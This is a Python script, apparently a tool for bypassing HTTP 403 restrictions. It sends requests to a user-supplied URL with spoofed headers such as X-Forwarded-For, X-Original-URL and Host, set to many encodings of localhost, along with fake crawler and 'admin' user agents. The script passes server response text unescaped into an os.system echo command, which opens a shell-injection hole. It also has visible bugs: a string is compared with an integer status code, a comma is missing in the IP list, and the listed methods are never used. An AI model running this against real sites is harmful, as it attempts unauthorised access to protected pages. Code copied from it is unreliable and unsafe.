import requests 
import os

print("enter your url : ")
url = input().replace(" ", "")
lists = [      
        'Referer',
        'X-Custom-IP-Authorization',
        'X-Forwarded-For',
        'X-rewrite-url',
	      'X-Original-URL',
        "X-Originating-IP",
        "X-Forwarded",
        "Forwarded-For",
        "X-Remote-IP",
        "X-Remote-Addr",
        "X-ProxyUser-Ip",
        "X-Original-URL",
        "Client-IP",
        "True-Client-IP",
        "Cluster-Client-IP",
        "X-ProxyUser-Ip",
        "Host"
    ]
ips = [
    "127.0.0.1",
    "127.0.0.2",
    "http://127.0.0.1",
    "::ffff:7f00:0001",
    "http://::ffff:7f00:0001"
    "0000:0000:0000:0000:0000:ffff:7f00:0001",
    "http://0000:0000:0000:0000:0000:ffff:7f00:0001",
    "2130706433",
    "http://2130706433",
    "0x7F000001",
    "http://0x7F000001",
    "localhost",
    "http://localhost",
    "[::1]",
    "::1",
    "::",
    "http://0/",
    "http://127.1/",
    "http://127.0.1/",
    "http://127.127.127.127/",
    "http://127.0.1.3/",
    "http://127.0.0.0/",
    "http://[::]:80/",
    "http://0000:80/::1/",
    "https://127.0.0.1/",
    "https://localhost/",
    f"{url}",
    "/admin",
]    
headerList=[
    'get',
    "post",
    "head",
    "options",
    "put",
]

useragents=[ 
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
        # "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
        # "Mozilla/5.0 (Linux; U; Android 4.4.2; es-es; SM-T210R Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
        # "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4",
        # "Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36",
        "Googlebot", "Bingbot", "admin" 
        ]
for list in lists:
    for ip in ips:
        for user in useragents:
            for head in headerList:
                headers = {
                    "User-Agent":f"{user}",
                    "Accept":"*/*",
                    "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding":"gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded",
                    f"{list}":f"{ip}",
                    }
                r = requests.head(url,headers=headers)

                print(f"{r.status_code} {list}:{ip}")
                if "403" != r.status_code:
                    os.system(f'echo {r.text} ,{list}:{ip} > output.txt')
